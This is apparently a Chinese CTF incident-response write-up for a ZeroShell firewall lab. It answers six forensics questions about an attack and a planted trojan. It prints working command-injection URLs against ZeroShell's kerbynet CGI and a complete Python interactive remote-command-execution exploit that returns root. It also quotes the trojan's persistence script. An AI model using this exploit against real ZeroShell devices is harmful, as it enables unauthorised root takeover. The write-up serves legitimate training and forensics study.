+++
title = "应急响应-zeroshell"
date = 2026-06-16T16:19:35+08:00
draft = false
description = "ccb2024-初赛应急响应"
tags = ["CTF", "Misc", "应急响应", "取证", "Web"]
categories = ["CTF", "Misc", "应急响应", "取证", "Web"]
series = ["CTF", "Misc", "应急响应", "取证", "Web"]
pin = false
+++
# 1、环境安装

解压环境zeroshell.7z，使用vmware17或以上版本加载zeroshell虚拟机

# 2、配置网络

1，打开虚拟网络编辑器

2、选择VMnet8 Net模式网卡，选择更改配置

3、选择VMnet8 网络，修改子网IP为61.139.2.0，再点击应用和确定

4、启动虚拟机，等虚拟机启动完成后，浏览器打开http://61.139.2.100 即可访问zeroshell防火墙环境


# 1.从数据包中找出攻击者利用漏洞开展攻击的会话（攻击者执行了一条命令），写出该会话中设置的flag, 结果提交形式：flag{xxxxxxxxx}


工具一把梭了
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161614782.png)

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161627699.png)


flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A}



# 2.通过漏洞利用获取设备控制权限，然后查找设备上的flag文件，提取flag文件内容，结果提交形式：flag{xxxxxxxxxx}


在流量包中找到攻击payload   
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161643965.png)

```c
http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec='ls /'%0A'
```
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161659762.png)

```c
http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec='cat /Database/flag'%0A'
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161714530.png)


flag{c6045425-6e6e-41d0-be09-95682a4f65c4}


# 3.找出受控机防火墙设备中驻留木马的外联域名或IP地址，结果提交形式：flag{xxxx}，如flag{www.abc.com} 或 flag{16.122.33.44}


这个我们可以进行用poc 直接打  也可以进行反弹shell  

我们进行poc打


```python

import requests

import argparse

import logging

import urllib3

# Disable warnings from urllib3

urllib3.disable_warnings()

# Set up logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def parse_arguments():

parser = argparse.ArgumentParser(description='Exploit ZeroShell 3.9.0 Remote Command Execution vulnerability.')

parser.add_argument('-u', '--url', required=True, help='Base target URI (e.g., http://target-uri/)')

return parser.parse_args()

def check_target(session, url):

try:

response = session.get(url + "/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0Aid%0A'", verify=False)

response.raise_for_status()

if response.status_code == 200:

logging.info('ZeroShell 3.9.0 Remote Command Execution')

logging.info('Successfully connected to target')

return True

except requests.exceptions.RequestException as e:

logging.error(f'Failed to connect to {url}: {e}')

return False

def execute_command(session, url, cmd):

payload = f"/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec='{cmd}'%0A'"

uri_vuln = url + payload

headers = {

"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",

"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",

"Accept-Language": "en-US,en;q=0.5",

"Accept-Encoding": "gzip, deflate",

"Connection": "close",

"Upgrade-Insecure-Requests": "1"

}

try:

response = session.get(uri_vuln, headers=headers, verify=False)

response.raise_for_status()

end_index = response.text.rindex("<html>")

print(response.text[:end_index])

except requests.exceptions.RequestException as e:

logging.error(f'Failed to execute command on {url}: {e}')

def main():

args = parse_arguments()

session = requests.Session()

if check_target(session, args.url):

while True:

try:

cmd = input("$ ")

if cmd.lower() in ['exit', 'quit']:

break

execute_command(session, args.url, cmd)

except KeyboardInterrupt:

break

if __name__ == "__main__":

main()
```


发现能够打通

```c
PS Z:\Desktop> python 2.py -u http://61.139.2.100/
2025-12-19 09:45:32,500 - INFO - ZeroShell 3.9.0 Remote Command Execution
2025-12-19 09:45:32,500 - INFO - Successfully connected to target
$ id
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
```


然后将Poc中的放到ai中检查外联或者放到工具箱中也行

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161728529.png)

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161743611.png)


可疑确定外链地址就是

flag{202.115.89.103}


# 4.请写出木马进程执行的本体文件的名称，结果提交形式:flag{xxxxx}，仅写文件名不加路径


在linux每个运行中的进程在/proc下都有一个对应的目录，名称为进程ID。这些目录包含了多个文件和子目录，记录了进程的状态、资源使用等信息

ls -l /proc/17515/

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161758477.png)


flag{.nginx}

# 5.请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥，结果提交形式:flag{xxxx}


我们已经找到了木马文件.nginx,直接cat就是文件的ascii,不好提取，我们可以用到xxd命令只显示16进制把他16进制提取出来，去010导入16进制


然后导入ida中，发现是
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161809271.png)


flag{11223344qweasdzxc}



# 6.请写出驻留木马的启动项，注意写出启动文件的完整路径。结果提交形式:flag{xxxx}，如flag{/a/b/c}


查看环境变量

env
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161834710.png)

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260616161845242.png)

```
$ cat /var/register/system/startup/scripts/nat/File
cp /Database/.nginx /tmp/.nginx
chmod +x /tmp/.nginx
/tmp/.nginxcp /Database/.nginx /tmp/.nginx
chmod +x /tmp/.nginx
/tmp/.nginx
```

flag{/var/register/system/startup/scripts/nat/File}














